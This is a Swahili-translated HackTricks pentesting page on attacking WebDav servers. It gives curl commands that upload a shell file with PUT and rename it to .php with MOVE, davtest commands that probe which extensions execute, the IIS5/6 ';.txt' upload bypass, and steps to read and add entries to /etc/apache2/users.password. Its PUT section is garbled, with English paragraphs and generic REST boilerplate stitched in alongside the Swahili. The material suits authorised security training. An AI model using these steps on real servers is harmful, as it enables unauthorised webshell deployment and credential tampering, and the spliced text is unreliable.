# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Unaposhughulika na **Seva ya HTTP iliyo na WebDav** imewezeshwa, ni **rahisisha kubadilisha faili** ikiwa una **vitambulisho sahihi**, kawaida huthibitishwa kupitia **Uthibitishaji wa Msingi wa HTTP**. Kupata udhibiti juu ya seva kama hiyo mara nyingi kunahusisha **kupakia na kutekeleza webshell**.

Upatikanaji wa seva ya WebDav kwa kawaida unahitaji **vitambulisho halali**, na [**WebDav bruteforce**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) ni njia ya kawaida ya kuvipata.

Ili kushinda vizuizi vya kupakia faili, haswa vile vinavyozuia utekelezaji wa skripti za upande wa seva, unaweza:

- **Kupakia** faili na **nyongeza za utekelezaji** moja kwa moja ikiwa hazijazuiliwa.
- **Kubadilisha jina** la faili iliyopakiwa ambayo sio ya utekelezaji (kama .txt) kuwa na nyongeza ya utekelezaji.
- **Nakili** faili iliyopakiwa ambayo sio ya utekelezaji, ikibadilisha nyongeza yake kuwa nyongeza inayoweza kutekelezwa.

## DavTest

**Davtest** jaribu **kupakia faili kadhaa zenye nyongeza tofauti** na **angalia** ikiwa nyongeza ina **utekelezwa**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Mfano wa matokeo:

![](<../../.gitbook/assets/image (19) (1).png>)

Hii haimaanishi kuwa **.txt** na **.html extensions zinafanywa**. Hii inamaanisha kuwa unaweza **kufikia faili hizi** kupitia wavuti.

## Cadaver

Unaweza kutumia chombo hiki ku **unganisha kwenye seva ya WebDav** na kufanya vitendo (kama **kupakia**, **kuhamisha** au **kufuta**) **kwa mkono**.
```
cadaver <IP>
```
## Ombi la PUT

The PUT method is used in HTTP to send data to the server to create or update a resource. It is commonly used in web development and web services.

Njia ya PUT hutumiwa katika HTTP kutuma data kwa seva ili kuunda au kusasisha rasilimali. Mara nyingi hutumiwa katika maendeleo ya wavuti na huduma za wavuti.

### Syntax

The syntax for a PUT request is as follows:

```http
PUT /path/to/resource HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "key": "value"
}
```

### Sintaksia

Sintaksia ya ombi la PUT ni kama ifuatavyo:

```http
PUT /njia/ya/asilimia HTTP/1.1
Host: mfano.com
Content-Type: application/json

{
  "ufunguo": "thamani"
}
```

In this example, we are sending a PUT request to `example.com` to create or update a resource located at `/path/to/resource`. The request body contains JSON data with a key-value pair.

Katika mfano huu, tunatuma ombi la PUT kwa `mfano.com` ili kuunda au kusasisha rasilimali iliyopo katika `/njia/ya/asilimia`. Mwili wa ombi una data ya JSON na jozi ya ufunguo-thamani.

### Usage

The PUT method is commonly used in RESTful APIs to update resources. It can be used to create a new resource if the specified resource does not exist, or update an existing resource if it does.

Njia ya PUT mara nyingi hutumiwa katika API za RESTful kuwasasisha rasilimali. Inaweza kutumika kuunda rasilimali mpya ikiwa rasilimali iliyotajwa haipo, au kusasisha rasilimali iliyopo ikiwa ipo.

### Security Considerations

When using the PUT method, it is important to consider security implications. Ensure that proper authentication and authorization mechanisms are in place to prevent unauthorized access or modification of resources.

Wakati wa kutumia njia ya PUT, ni muhimu kuzingatia masuala ya usalama. Hakikisha kuwa kuna mifumo sahihi ya uwakilishi na idhini ili kuzuia ufikiaji usiohalali au mabadiliko ya rasilimali.
```
curl -T 'shell.txt' 'http://$ip'
```
## Ombi la KUHAMISHA

The MOVE request is used in WebDAV to move a resource from one location to another. It is similar to the HTTP POST method, but specifically designed for WebDAV operations.

Ombi la KUHAMISHA linatumika katika WebDAV kuhamisha rasilimali kutoka eneo moja hadi lingine. Ni sawa na njia ya HTTP POST, lakini imeundwa mahsusi kwa ajili ya shughuli za WebDAV.
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha** mchakato wa kazi kwa kutumia zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Udhaifu wa IIS5/6 WebDav

Udhaifu huu ni wa kuvutia sana. **WebDav** **hauruhusu** kupakia au kubadilisha jina la faili lenye kipengee **.asp**. Lakini unaweza **kupita** hii kwa kuongeza mwishoni mwa jina **";.txt"** na faili itatekelezwa kama faili ya .asp (unaweza pia **kutumia ".html" badala ya ".txt"** lakini **USISAHAU ";"**).

Kisha unaweza **kupakia** kikoa chako kama faili ya ".**txt"** na **kuichukua/kuhamisha** kama faili ya ".asp;.txt". Kwa kufikia faili hiyo kupitia seva ya wavuti, itatekelezwa (cadaver itasema kuwa hatua ya kuhamisha haikufanya kazi, lakini ilifanya).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Tuma siri za kibinafsi

Ikiwa Webdav ilikuwa inatumia seva ya Apache unapaswa kutazama tovuti zilizowekwa katika Apache. Kawaida:\
_**/etc/apache2/sites-enabled/000-default**_

Ndani yake unaweza kupata kitu kama:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Kama unavyoona, kuna faili na **vitambulisho** halali kwa seva ya **webdav**:
```
/etc/apache2/users.password
```
Ndani ya aina hii ya faili utapata **jina la mtumiaji** na **hash** ya nenosiri. Hizi ni sifa ambazo seva ya webdav inatumia kuthibitisha watumiaji.

Unaweza kujaribu **kuvunja** au **kuongeza zaidi** ikiwa kwa sababu fulani unataka **kupata** seva ya **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Ili kuthibitisha ikiwa anwani mpya za kuingia zinafanya kazi, unaweza kufanya yafuatayo:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Marejeo
* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuendesha mchakato** wa kiotomatiki uliofanywa na zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
